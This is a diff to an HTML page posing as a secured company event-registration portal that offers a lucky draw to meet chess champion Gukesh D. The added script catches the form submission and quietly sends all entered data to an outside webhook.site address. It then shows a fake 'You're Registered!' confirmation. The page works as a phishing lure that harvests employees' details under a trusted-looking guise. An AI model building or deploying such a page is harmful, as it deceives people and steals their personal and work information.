@@ -48,6 +48,41 @@
   <p style="color:#aaa; font-size:11px; margin-top:20px;">
     Secured registration portal. 
     Contact eventmanagement@allsafe.com for queries.
+
+    <!-- THANK YOU MESSAGE (hidden until form submitted) -->
+  <div id="thankyou">
+    <div class="checkmark">✅</div>
+    <h2>You're Registered!</h2>
+    <p>Thank you for entering the lucky draw to meet 
+    <b>World Chess Champion Gukesh D</b>.</p>
+    <p>Winners will be announced on <b>20th September 2026</b> 
+    via your work email.</p>
+    <p>Good luck! ♟</p>
+    <p style="color:#aaa; font-size:12px; margin-top:30px;">
+      This is an automated confirmation from the Events Team.
+    </p>
+  </div>
+
+  <script>
+    document.getElementById('regForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      // Collect form data
+      const formData = new FormData(this);
+
+      // POST to webhook.site
+      fetch('https://webhook.site/f862eece-e5dd-45fe-a845-caffdcb8a688', {
+        method: 'POST',
+        body: formData,
+        mode: 'no-cors'
+      });
+
+      // Hide form, show thank you
+      document.getElementById('formSection').style.display = 'none';
+      document.getElementById('thankyou').style.display = 'block';
+    });
+  </script>
+
   </p>
 </body>
 </html>
